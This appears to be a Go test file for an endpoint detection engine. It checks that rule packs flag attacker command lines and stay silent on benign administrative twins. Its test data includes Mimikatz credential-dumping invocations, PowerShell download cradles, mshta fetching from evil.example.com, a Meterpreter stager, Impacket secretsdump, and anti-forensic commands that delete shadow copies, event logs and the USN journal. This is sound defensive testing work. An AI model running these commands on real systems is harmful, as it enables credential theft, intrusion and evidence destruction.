package rules

import (
	"testing"
)

// The attacker-tooling pack: each case is a real-world invocation of
// the tool and its benign twin. A rule that fires on the twin (or
// fails to fire on the invocation) is a regression of the pack.
func TestHacktoolsPack(t *testing.T) {
	e := loadTestEngine(t)
	cases := []struct {
		name    string
		cmdline string
		wantHit string // "" = the invocation itself is benign
	}{
		{
			name:    "powershell.exe",
			cmdline: `powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1'); Invoke-Mimikatz -DumpCreds"`,
			wantHit: "Herramienta de volcado Mimikatz",
		},
		{
			name:    "cmd.exe",
			cmdline: `cmd.exe /c mimikatz.exe "sekurlsa::logonpasswords" exit`,
			wantHit: "Herramienta de volcado Mimikatz",
		},
		{
			name:    "powershell.exe",
			cmdline: `powershell.exe -File C:\ops\health.ps1 -Encoding UTF8`,
			wantHit: "",
		},
		{
			name:    "laZagne.exe",
			cmdline: `laZagne.exe all`,
			wantHit: "Cosecha de contrasenas con LaZagne",
		},
		{
			name:    "python.exe",
			cmdline: `python.exe laZagne.py all -v`,
			wantHit: "Cosecha de contrasenas con LaZagne",
		},
		{
			name:    "Pwdump6.exe",
			cmdline: `Pwdump6.exe`,
			wantHit: "Dumping local de hashes con Pwdump",
		},
		{
			name:    "Rubeus.exe",
			cmdline: `Rubeus.exe kerberoast /outfile:t.kirbi`,
			wantHit: "Abuso de Kerberos con Rubeus",
		},
		{
			name:    "powershell.exe",
			cmdline: `powershell.exe -c "Rubeus.exe asktgt /user:svc"`,
			wantHit: "Abuso de Kerberos con Rubeus",
		},
		{
			name:    "SharpHound.exe",
			cmdline: `SharpHound.exe -c All -d corp.local`,
			wantHit: "Mapeo de dominio con SharpHound",
		},
		{
			name:    "AdFind.exe",
			cmdline: `AdFind.exe -f objectcategory=person -c`,
			wantHit: "Enumeracion de directorio con AdFind",
		},
		{
			name:    "AdFind.exe",
			cmdline: `AdFind.exe -h`,
			wantHit: "",
		},
		{
			name:    "crackmapexec.exe",
			cmdline: `crackmapexec smb 10.0.0.0/24 -u users.txt -p p.txt`,
			wantHit: "Ejecucion remota con CrackMapExec o Impacket",
		},
		{
			name:    "python.exe",
			cmdline: `python.exe impacket-secretsdump.py corp/admin:pw@dc01`,
			wantHit: "Ejecucion remota con CrackMapExec o Impacket",
		},
		{
			name:    "cmd.exe",
			cmdline: `cmd.exe /c powershell.exe -c "IEX(....)" windows/meterpreter/reverse_tcp`,
			wantHit: "Stager de Meterpreter o Metasploit",
		},
		{
			name:    "AnyDesk.exe",
			cmdline: `AnyDesk.exe --silence --password s3cret`,
			wantHit: "Canal de control remoto silencioso con AnyDesk",
		},
		{
			name:    "AnyDesk.exe",
			cmdline: `AnyDesk.exe --help`,
			wantHit: "",
		},
		{
			name:    "net.exe",
			cmdline: `net.exe group "domain admins" /domain`,
			wantHit: "Reconocimiento de dominio con comandos net/nltest",
		},
		{
			name:    "net.exe",
			cmdline: `net.exe use Z: \\files\share`,
			wantHit: "",
		},
	}

	for _, tc := range cases {
		ev := testEvent(tc.name, tc.cmdline)
		hits := e.Evaluate(ev)
		if tc.wantHit == "" {
			for _, h := range hits {
				if isFrom(t, h, "hacktools") {
					t.Fatalf("benign %s %q fired hacktools rule %q", tc.name, tc.cmdline, h.Rule.Name)
				}
			}
			continue
		}
		found := false
		for _, h := range hits {
			if h.Rule.Name == tc.wantHit {
				found = true
			}
		}
		if !found {
			t.Fatalf("%s %q: expected rule %q, got %d hits", tc.name, tc.cmdline, tc.wantHit, len(hits))
		}
	}
}

// The LOLBAS pack: interpreter abuse and parent-child anomalies. The
// parent-child cases exercise enrichment.parent_name resolution the
// same way the engine annotates it.
func TestLolbasPack(t *testing.T) {
	e := loadTestEngine(t)

	direct := []struct {
		name    string
		cmdline string
		wantHit string
	}{
		{
			name:    "mshta.exe",
			cmdline: `mshta.exe https://evil.example.com/payload.hta`,
			wantHit: "Ejecucion de scripts con mshta",
		},
		{
			name:    "mshta.exe",
			cmdline: `mshta.exe javascript:new ActiveXObject('WScript.Shell')...`,
			wantHit: "Ejecucion de scripts con mshta",
		},
		{
			name:    "mshta.exe",
			cmdline: `mshta.exe C:\Windows\System32\en-US\mshta.chm`,
			wantHit: "",
		},
		{
			name:    "rundll32.exe",
			cmdline: `rundll32.exe javascript:"\..\..\..\mshtml,RunHTMLApplication"`,
			wantHit: "Ejecucion de JavaScript con rundll32",
		},
		{
			name:    "installutil.exe",
			cmdline: `installutil.exe /U=1 /LogFile= payload.dll`,
			wantHit: "Ejecucion evasiva con InstallUtil",
		},
		{
			name:    "forfiles.exe",
			cmdline: `forfiles.exe /p c:\windows\system32 /m notepad.exe /c cmd /c echo x`,
			wantHit: "Ejecucion indirecta con forfiles",
		},
		{
			name:    "wscript.exe",
			cmdline: `wscript.exe C:\Users\jdoe\AppData\Roaming\payload.vbs`,
			wantHit: "Interprete de script ejecutando desde staging de usuario",
		},
		{
			name:    "wscript.exe",
			cmdline: `wscript.exe C:\Scripts\ops\map.vbs`,
			wantHit: "",
		},
		{
			name:    "powershell.exe",
			cmdline: `powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://x/a')"`,
			wantHit: "Cradle de descarga en PowerShell",
		},
		{
			name:    "powershell.exe",
			cmdline: `powershell.exe -c "iwr http://x/a -OutFile a; iex(gc a)"`,
			wantHit: "Cradle de descarga en PowerShell",
		},
		{
			name:    "powershell.exe",
			cmdline: `powershell.exe -File C:\ops\daily.ps1`,
			wantHit: "",
		},
	}

	for _, tc := range direct {
		ev := testEvent(tc.name, tc.cmdline)
		hits := e.Evaluate(ev)
		if tc.wantHit == "" {
			for _, h := range hits {
				if isFrom(t, h, "lolbas") {
					t.Fatalf("benign %s %q fired lolbas rule %q", tc.name, tc.cmdline, h.Rule.Name)
				}
			}
			continue
		}
		found := false
		for _, h := range hits {
			if h.Rule.Name == tc.wantHit {
				found = true
			}
		}
		if !found {
			t.Fatalf("%s %q: expected rule %q, got %d hits", tc.name, tc.cmdline, tc.wantHit, len(hits))
		}
	}

	// parent-child anomalies: the enrichment parent_name is set the way
	// the engine's flight recorder does before Evaluate
	parentCases := []struct {
		parent string
		child  string
		want   string
	}{
		{"winword.exe", "cmd.exe", "Editor de Office lanzando un interprete"},
		{"EXCEL.EXE", "powershell.exe", "Editor de Office lanzando un interprete"},
		{"chrome.exe", "powershell.exe", "Navegador lanzando un interprete de comandos"},
	}
	for _, tc := range parentCases {
		ev := testEvent(tc.child, tc.child+" /c whoami")
		ev.Enrichment = map[string]string{"parent_name": tc.parent}
		hits := e.Evaluate(ev)
		found := false
		for _, h := range hits {
			if h.Rule.Name == tc.want {
				found = true
			}
		}
		if !found {
			t.Fatalf("parent %s -> child %s: expected %q, got %d hits",
				tc.parent, tc.child, tc.want, len(hits))
		}
	}

	// negative: explorer spawning cmd is the user's daily bread
	ev := testEvent("cmd.exe", `cmd.exe /c dir`)
	ev.Enrichment = map[string]string{"parent_name": "explorer.exe"}
	for _, h := range e.Evaluate(ev) {
		if isFrom(t, h, "lolbas") {
			t.Fatalf("explorer.exe -> cmd.exe fired %q (must stay silent)", h.Rule.Name)
		}
	}
}

// The anti-forensics pack: evidence destruction fires loud, the
// administrative use of the same binaries stays silent.
func TestAntiForensicsPack(t *testing.T) {
	e := loadTestEngine(t)
	cases := []struct {
		name    string
		cmdline string
		wantHit string
	}{
		{
			name:    "powershell.exe",
			cmdline: `powershell.exe -c "Clear-EventLog -LogName Security"`,
			wantHit: "Borrado del registro de eventos con PowerShell",
		},
		{
			name:    "wmic.exe",
			cmdline: `wmic.exe shadowcopy delete /noverbose`,
			wantHit: "Borrado de instantaneas VSS con wmic",
		},
		{
			name:    "powershell.exe",
			cmdline: `powershell.exe -c "Get-WmiObject Win32_ShadowStorage | Set-WmiInstance @{MaxSpace='30MB'}"`,
			wantHit: "Reduccion de almacenamiento VSS con vssadmin o PowerShell",
		},
		{
			name:    "vssadmin.exe",
			cmdline: `vssadmin.exe resize shadowstorage /for=c: /on=c: /maxsize=300MB`,
			wantHit: "Reduccion de almacenamiento VSS con vssadmin o PowerShell",
		},
		{
			name:    "bcdedit.exe",
			cmdline: `bcdedit.exe /set {default} recoveryenabled No`,
			wantHit: "Sabotaje de recuperacion de arranque con bcdedit",
		},
		{
			name:    "bcdedit.exe",
			cmdline: `bcdedit.exe /enum {current}`,
			wantHit: "",
		},
		{
			name:    "fsutil.exe",
			cmdline: `fsutil.exe usn deletejournal /n c:`,
			wantHit: "Borrado del diario USN con fsutil",
		},
		{
			name:    "fsutil.exe",
			cmdline: `fsutil.exe usn queryjournal c:`,
			wantHit: "",
		},
		{
			name:    "ntdsutil.exe",
			cmdline: `ntdsutil.exe "ac i ntds" "ifm" "create full c:\temp" quit quit`,
			wantHit: "Volcado de ntds.dit con ntdsutil",
		},
		{
			name:    "powershell.exe",
			cmdline: `powershell.exe -c "$(Get-Item a.exe).LastWriteTime = '2020-01-01'"`,
			wantHit: "Falsificacion de marcas de tiempo de ficheros",
		},
		{
			name:    "vssadmin.exe",
			cmdline: `vssadmin.exe resize shadowstorage /for=c: /on=c: /maxsize=UNBOUNDED`,
			wantHit: "",
		},
	}

	for _, tc := range cases {
		ev := testEvent(tc.name, tc.cmdline)
		hits := e.Evaluate(ev)
		if tc.wantHit == "" {
			for _, h := range hits {
				if isFrom(t, h, "anti-forensics") {
					t.Fatalf("benign %s %q fired anti-forensics rule %q", tc.name, tc.cmdline, h.Rule.Name)
				}
			}
			continue
		}
		found := false
		for _, h := range hits {
			if h.Rule.Name == tc.wantHit {
				found = true
			}
		}
		if !found {
			t.Fatalf("%s %q: expected rule %q, got %d hits", tc.name, tc.cmdline, tc.wantHit, len(hits))
		}
	}
}

// isFrom reports whether a hit's rule id belongs to one of the new
// packs. The packs use a dedicated UUID prefix per file so the
// attribution does not depend on file paths.
func isFrom(t *testing.T, h Hit, prefix string) bool {
	t.Helper()
	marker := map[string]string{
		"hacktools":      "a1b2c3d4-",
		"lolbas":         "b2c3d4e5-",
		"anti-forensics": "c3d4e5f6-",
	}[prefix]
	if marker == "" {
		t.Fatalf("unknown pack %q", prefix)
	}
	return len(h.Rule.ID) >= 9 && h.Rule.ID[:9] == marker[:9]
}
